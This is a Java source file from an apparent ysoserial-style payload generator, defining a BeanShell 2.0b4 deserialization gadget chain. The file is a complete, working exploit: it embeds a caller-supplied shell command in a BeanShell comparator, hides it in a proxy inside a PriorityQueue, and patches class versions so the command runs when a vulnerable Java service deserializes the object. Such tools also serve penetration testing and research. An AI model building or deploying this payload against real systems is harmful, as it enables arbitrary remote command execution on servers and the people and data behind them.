package A.R.ysogate.payloads.gadgets;

import A.R.ysogate.Strings;
import A.R.ysogate.payloads.utils.PayloadRunner;
import bsh.BshClassManager;
import bsh.Interpreter;
import javassist.CtClass;
import A.R.ysogate.payloads.ObjectPayload;
import A.R.ysogate.payloads.annotation.Dependencies;
import A.R.ysogate.payloads.utils.Reflections;

import java.lang.reflect.*;
import java.util.Arrays;
import java.util.Comparator;
import java.util.PriorityQueue;

import static A.R.ysogate.payloads.config.Config.POOL;
import static A.R.ysogate.payloads.handle.ClassFieldHandler.insertField;

/**
 * @author su18
 */
@Dependencies({"org.beanshell:bsh:2.0b4"})
public class BeanShell20b4 extends PayloadRunner implements ObjectPayload<PriorityQueue> {

	public PriorityQueue getObject(String command) throws Exception {
		String payload =
				"compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{" +
						Strings.join( // does not support spaces in quotes
								Arrays.asList(command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\\"").split(" ")),
								",", "\"", "\"") +
						"}).start();return new Integer(1);}";

		CtClass ctClass4 = POOL.get("bsh.Primitive");
		insertField(ctClass4, "serialVersionUID", "private static final long serialVersionUID = -1164390191642946889L;");
		ctClass4.toClass();

		CtClass ctClass = POOL.get("bsh.XThis$Handler");
		insertField(ctClass, "serialVersionUID", "private static final long serialVersionUID = 4949939576606791809L;");
		Class             handlerClass = ctClass.toClass();
		InvocationHandler handler      = (InvocationHandler) Reflections.createWithoutConstructor(handlerClass);

		CtClass ctClass2 = POOL.get("bsh.XThis");
		insertField(ctClass2, "serialVersionUID", "private static final long serialVersionUID = -6803452281441498586L;");
		Class thisClass = ctClass2.toClass();

		CtClass ctClass3 = POOL.get("bsh.NameSpace");
		insertField(ctClass3, "serialVersionUID", "private static final long serialVersionUID = -2499232412105981353L;");
		Class       space       = ctClass3.toClass();
		Constructor constructor = space.getConstructor(BshClassManager.class, String.class);

		Interpreter i = new Interpreter();

		Reflections.setFieldValue(i, "evalOnly", false);
		Reflections.setFieldValue(i, "globalNameSpace", constructor.newInstance(BshClassManager.createClassManager(i), "global"));
		Reflections.getMethodAndInvoke(i, "setu", new Class[]{String.class, Object.class}, new Object[]{"bsh.evalOnly", null});
		Reflections.getMethodAndInvoke(i, "setu", new Class[]{String.class, Object.class}, new Object[]{"bsh.cwd", "."});
		i.eval(payload);

		Object xt = Reflections.createWithoutConstructor(thisClass);
		Reflections.setFieldValue(xt, "invocationHandler", handler);
		Reflections.setFieldValue(xt, "namespace", i.getNameSpace());
		Reflections.setFieldValue(xt, "declaringInterpreter", i);

		Reflections.setFieldValue(handler, "this$0", xt);

		Comparator<? super Object> comparator    = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class[]{Comparator.class}, handler);
		PriorityQueue<Object>      priorityQueue = new PriorityQueue(2, comparator);
		Object[]                   queue         = {Integer.valueOf(1), Integer.valueOf(1)};
		Reflections.setFieldValue(priorityQueue, "queue", queue);
		Reflections.setFieldValue(priorityQueue, "size", Integer.valueOf(2));
		return priorityQueue;
	}
	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(BeanShell20b4.class, args);
	}
}
